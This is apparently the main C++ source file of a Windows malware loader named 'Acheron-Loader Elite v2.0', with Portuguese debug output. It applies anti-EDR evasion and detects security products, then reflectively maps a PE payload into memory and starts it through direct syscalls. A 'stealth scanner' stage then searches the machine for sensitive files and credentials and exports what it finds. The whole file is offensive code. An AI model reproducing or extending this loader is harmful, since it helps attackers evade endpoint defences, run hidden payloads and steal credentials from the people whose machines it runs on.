#include <windows.h>
#include "src/core/syscalls_advanced.h"
#include "src/core/memory_manager.h"
#include "src/core/pe_loader.h"
#include "src/evasion/anti_edr.h"
#include "src/payloads/stealth_scanner.h"
#include "src/utils/logger.h"
#include "src/utils/config.h"

class Acheron
{
public:
    int Run(int argc, wchar_t* argv[])
    {
        printf("[1] Iniciando Run()\n"); fflush(stdout);

        if (!Config::Instance().ParseCommandLine(argc, argv))
            return 0;

        printf("[2] ParseCommandLine OK\n"); fflush(stdout);

        auto& logger = Logger::Instance();
        printf("[3] Logger::Instance OK\n"); fflush(stdout);

        if (!logger.Initialize(Config::Instance().GetLogPath(),
            Config::Instance().GetMinLevel(),
            Config::Instance().IsConsoleOutput()))
        {
            wprintf(L"Falha no logger\n");
            return 1;
        }

        printf("[4] Logger inicializado\n"); fflush(stdout);
        LOG_INFO(L"=== Acheron-Loader Elite v2.0 ===");
        printf("[5] LOG_INFO OK\n"); fflush(stdout);

        if (!SyscallManager::Initialize()) { LOG_ERROR(L"Falha SyscallManager"); return 1; }
        printf("[6] SyscallManager OK\n"); fflush(stdout);

        if (!MemoryManager::Instance().Initialize()) { LOG_ERROR(L"Falha MemoryManager"); return 1; }
        printf("[7] MemoryManager OK\n"); fflush(stdout);

        AntiEDR::Initialize();
        AntiEDR::ApplyAll();
        printf("[8] AntiEDR OK\n"); fflush(stdout);

        auto edrs = AntiEDR::DetectEDRs();
        printf("[9] EDRs: %zu\n", edrs.size()); fflush(stdout);

        if (Config::Instance().IsPayloadEnabled())
        {
            printf("[10] Payload...\n"); fflush(stdout);
            PELoader loader;
            if (loader.LoadFromFile(Config::Instance().GetPayloadPath()) && loader.MapToMemory())
            {
                loader.ResolveImports();
                loader.SetMemoryProtections();

                PVOID ep = loader.GetEntryPoint();
                if (ep)
                {
                    HANDLE hThread = nullptr;
                    if (SyscallManager::CreateThreadEx(&hThread, ep))
                    {
                        LOG_INFO(L"Payload executado");
                        WaitForSingleObject(hThread, Config::Instance().GetMaxExecutionTime() * 1000);
                        CloseHandle(hThread);
                    }
                }
            }
            loader.Cleanup();
            printf("[11] Payload finalizado\n"); fflush(stdout);
        }

        if (Config::Instance().IsScannerEnabled())
        {
            printf("[12] Scanner...\n"); fflush(stdout);
            StealthScanner scanner;
            if (scanner.Initialize())
            {
                scanner.ScanSensitiveData();
                scanner.ExportResults(Config::Instance().GetResultsPath());
                LOG_INFO(L"Scanner: %zu arquivos, %zu credenciais",
                    scanner.GetFilesScanned(), scanner.GetCredentialsFound());
            }
            printf("[13] Scanner finalizado\n"); fflush(stdout);
        }

        printf("[14] === Acheron finalizado ===\n"); fflush(stdout);
        return 0;
    }
};

int wmain(int argc, wchar_t* argv[])
{
    SetErrorMode(SEM_NOGPFAULTERRORBOX | SEM_FAILCRITICALERRORS);
    printf("[0] Antes do Run()\n"); fflush(stdout);
    Acheron app;
    return app.Run(argc, argv);
}